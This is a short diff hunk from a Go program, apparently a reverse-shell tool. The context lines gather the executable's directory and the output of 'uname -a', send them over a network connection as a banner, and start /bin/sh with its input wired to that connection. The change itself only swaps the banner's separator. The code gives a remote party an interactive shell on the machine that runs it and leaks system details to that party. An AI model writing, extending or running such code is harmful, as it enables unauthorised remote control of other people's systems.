@@ -906,7 +906,7 @@ func main(){
     dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));     
     version_check := exec.Command("sh", "-c", "uname -a");
     version, _ := version_check.Output();           
-    SysGuide := (string(dir) + " // " + string(version) + " // ");   
+    SysGuide := (string(dir) + " £ " + string(version) + " £ ");   
     connect.Write([]byte(string(SysGuide)))
     cmd:=exec.Command("/bin/sh");
     cmd.Stdin=connect;
